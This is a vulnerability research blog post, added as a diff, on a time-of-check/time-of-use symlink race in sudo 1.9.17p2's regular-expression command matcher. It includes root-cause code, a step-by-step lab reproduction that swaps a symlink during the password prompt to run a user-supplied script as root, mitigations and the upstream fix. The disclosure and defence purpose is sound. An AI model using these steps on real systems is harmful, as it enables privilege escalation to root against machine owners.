@@ -1,0 +1,193 @@
+---
+title: "When Sudo Checks One Path and Executes Another"
+date: "23 August 2026"
+readTime: "8 min"
+tag: Vulnerability Research
+summary: A path identity mismatch in sudo's regular-expression command matcher can turn a narrowly scoped command grant into root code execution when a user-controlled symlink is changed between policy validation and exec.
+---
+
+> **Research note:** I independently encountered and reproduced this behaviour while auditing sudo 1.9.17p2. The issue and its upstream fix were already public by the time of this write-up; I am not claiming original discovery. The exact first affected release has not been established here, so this post deliberately does not claim that every earlier sudo release is vulnerable.
+
+## The Short Version
+
+This is not a vulnerability in `/usr/bin/true`, and exploitation is not limited to that binary. It is a check-versus-execution mismatch in sudo's handling of command paths expressed as regular expressions.
+
+`true` is used throughout this post only because it makes a small, predictable demonstration. The same issue can apply to other regex-authorised executables, including `id`, `date`, `cat`, or an application-specific administrative tool. The attacker simply needs to create a replacement executable with the same basename. For an authorised `/usr/bin/date`, for example, the attacker would prepare their own executable named `date`.
+
+Consider a deliberately narrow sudoers entry:
+
+```sudoers
+low ALL=(root) ^/usr/bin/true$
+```
+
+The administrator intends to allow `low` to execute only `/usr/bin/true` as root. On the vulnerable code path, however, sudo can approve a user-controlled pathname because its canonical form matches the expression, then later execute the original pathname after it has been changed. Substitute another regex-authorised command and matching basename, and the same underlying path-identity mismatch applies; nothing in the bug depends on the behaviour of `true` itself.
+
+In a normal Linux environment, once that regex rule exists and covers the user, the user can generally create the remaining symlink and executable in their own home directory. No writable system directory or second administrator mistake is required.
+
+## Exact Paths and Regex Paths Are Different
+
+These two sudoers entries look almost equivalent:
+
+```sudoers
+# Exact pathname
+low ALL=(root) /usr/bin/true
+
+# Regular expression
+low ALL=(root) ^/usr/bin/true$
+```
+
+The `^` and `$` anchors mean “start” and “end”, so the second expression also describes exactly `/usr/bin/true`. Internally, though, sudo processes the two entries through different command matchers.
+
+The ordinary exact-path matcher binds the result to the trusted sudoers pathname. The vulnerable regex matcher could fall back to a canonicalised version of the submitted pathname for its policy decision without replacing the pathname later returned for execution.
+
+That difference creates a time-of-check/time-of-use race.
+
+## Root Cause
+
+Suppose the user submits:
+
+```text
+/home/low/switch/true
+```
+
+At first, `switch` is a symbolic link to `/usr/bin`. The submitted string does not match `^/usr/bin/true$`, but canonicalising its parent produces `/usr/bin/true`, which does match.
+
+In sudo 1.9.17p2, `command_matches_regex()` uses that canonical path to perform the match and command checks. After a successful fallback match, however, it does not set `ctx->runas.cmnd` to the path that was actually checked. The frontend can therefore retain the original user-controlled pathname for the eventual `exec`.
+
+### The Vulnerable Code
+
+The relevant portion of `plugins/sudoers/match_command.c` in sudo 1.9.17p2 is:
+
+```c
+cmnd = buf;
+if (regex_matches(sudoers_cmnd, cmnd) != ALLOW)
+    debug_return_int(DENY);
+
+/* The canonical path is checked here. */
+if (!open_cmnd(cmnd, runchroot, digests, &fd))
+    goto bad;
+if (digest_matches(fd, cmnd, runchroot, digests) != ALLOW)
+    goto bad;
+set_cmnd_fd(ctx, fd);
+
+/* No need to set ctx->runas.cmnd since cmnd matches sudoers_cmnd */
+debug_return_int(ALLOW);
+```
+
+The assignment `cmnd = buf` changes only the function's local pointer. It makes `cmnd` refer to the canonical path, such as `/usr/bin/true`, while `ctx->user.cmnd` still contains the submitted path, such as `/home/low/switch/true`.
+
+The vulnerable assumption is captured by the final comment. A regular-expression match does not mean that the two pathname strings are identical, and in the fallback case they are specifically different. Because the function returns success without copying the checked `cmnd` into `ctx->runas.cmnd`, the execution stage can fall back to `ctx->user.cmnd`.
+
+`set_cmnd_fd()` does not automatically close this gap in the demonstrated default configuration. With the default `fdexec=digest_only` setting and no digest in the rule, `open_cmnd()` does not retain an executable descriptor. The result is a successful policy decision with the original mutable pathname still selected for execution.
+
+The logic effectively becomes:
+
+```text
+check:    /home/low/switch/true -> /usr/bin/true
+approve:  /usr/bin/true matches ^/usr/bin/true$
+execute:  /home/low/switch/true
+```
+
+If `switch` is changed after approval to point at a user-owned directory containing another executable named `true`, sudo executes that replacement as root.
+
+The password prompt provides a convenient, deterministic pause between matching and execution. The underlying issue is still a pathname race rather than an authentication bug.
+
+## Safe Lab Reproduction
+
+Use an isolated test VM or container. Do not place this rule on a production machine.
+
+The test account needs this sudoers entry:
+
+```sudoers
+low ALL=(root) ^/usr/bin/true$
+```
+
+As `low`, prepare two directories and a harmless payload:
+
+```bash
+mkdir -p "$HOME/links" "$HOME/payload"
+ln -s /usr/bin "$HOME/links/switch"
+
+cat > "$HOME/payload/true" <<'EOF'
+#!/bin/sh
+id > /tmp/sudo-regex-race-proof
+EOF
+chmod 755 "$HOME/payload/true"
+```
+
+In the first terminal, invoke the path through the symlink and leave sudo waiting at the password prompt:
+
+```bash
+sudo -k
+sudo "$HOME/links/switch/true"
+```
+
+The `sudo -k` command invalidates the invoking user's cached credential timestamp so that this password-based reproduction does not silently skip the prompt.
+
+In a second terminal, replace the symlink before completing authentication:
+
+```bash
+ln -sfn "$HOME/payload" "$HOME/links/switch"
+```
+
+After the correct password is entered in the first terminal, a vulnerable build executes the replacement. The proof file records a root identity. A fixed build executes the checked `/usr/bin/true` instead and does not create the marker.
+
+This demonstration intentionally writes only an identity marker. The security consequence is arbitrary code execution as the sudo rule's target user, which is root in this example.
+
+## What Is Actually Required?
+
+The important administrator-created prerequisite is a regex command rule that covers the low-privileged user. The other ingredients are normally available to that user:
+
+1. A writable directory in their home directory or another executable filesystem.
+2. Permission to create and retarget a symbolic link there.
+3. Permission to create an executable with the same basename as the authorised command.
+4. A usable race window, commonly the normal sudo password prompt.
+
+The issue is not specific to `true`. That binary makes a clean demonstration because it takes no arguments and has no side effects. Other regex-authorised commands may be affected when the attacker can supply the same basename through a canonicalising, user-controlled path.
+
+This is therefore a **restricted-grant privilege escalation**, not a universal “any local user becomes root” vulnerability. A user who is not covered by a matching sudoers rule cannot use this bug to invent a grant.
+
+Settings that cause sudo to execute a securely retained descriptor may prevent this particular pathname swap. `fdexec=always` does this for path-matched commands. Under the default `fdexec=digest_only` setting, adding a command digest also causes sudo to execute the retained descriptor. A digest is not sufficient by itself when an administrator has explicitly configured `fdexec=never`. Filesystem policy such as `noexec`, SELinux, or AppArmor can also change exploitability. Those are environmental mitigations, not a correction of the identity mismatch.
+
+## Why the Plain Rule Is Different
+
+The specific exploit described here does not reproduce with the ordinary rule:
+
+```sudoers
+low ALL=(root) /usr/bin/true
+```
+
+The normal exact command matcher records the trusted sudoers pathname for execution. The vulnerable behaviour occurs in the regex and related pattern fallback where sudo checks the canonicalised path but fails to replace the original execution path.
+
+That distinction also explains why calling this “the `/bin/true` bug” is misleading. `/usr/bin/true` is just the sample authorised command; command-path identity is the security boundary that failed.
+
+## Fix
+
+At the time of writing, the current sudo development branch fixes the mismatch by setting the runas command to the canonical path after the command and digest checks succeed. In other words, the pathname that passed policy is now the pathname handed to the execution stage.
+
+The relevant upstream change is:
+
+- [`da295ca86d954200f567b2c72a816995b82961a2`: `command_matches_{fnmatch,regex}: set runas.cmnd after digest match`](https://github.com/sudo-project/sudo/commit/da295ca86d954200f567b2c72a816995b82961a2)
+
+Administrators running an affected package can reduce exposure by replacing regex command specifications with exact path entries where possible. Reviewing digest and `fdexec` policy may provide additional protection, but upgrading to a build containing the correction is the appropriate remediation.
+
+## Affected Versions
+
+My testing established the following narrow facts:
+
+- sudo 1.9.17p2 is vulnerable under the conditions described above.
+- upstream `main` containing commit `da295ca86d954200f567b2c72a816995b82961a2` is not vulnerable to this reproduction.
+- the exact first affected release has not been established.
+
+Sudo's own documentation states that regular-expression command specifications were introduced in 1.9.10. Releases before 1.9.10 are therefore outside this specific regex-command bug class. I have not established that every release from 1.9.10 through 1.9.17p2 contains the vulnerable fallback, so the final affected range should be based on upstream maintainer analysis and distribution backport history.
+
+## Takeaway
+
+The security lesson is broader than sudo: canonicalisation cannot be used only for the access-control decision. Once a program decides that one filesystem object is trusted, execution must stay bound to that same object or trusted pathname.
+
+Here, sudo correctly discovered that the submitted path resolved to `/usr/bin/true`, but the vulnerable path lost that identity before execution. A single user-controlled symlink was enough to turn the gap into root code execution.
+
+## References
+
+- [sudo upstream repository](https://github.com/sudo-project/sudo)
+- [Fix commit on the sudo development branch](https://github.com/sudo-project/sudo/commit/da295ca86d954200f567b2c72a816995b82961a2)
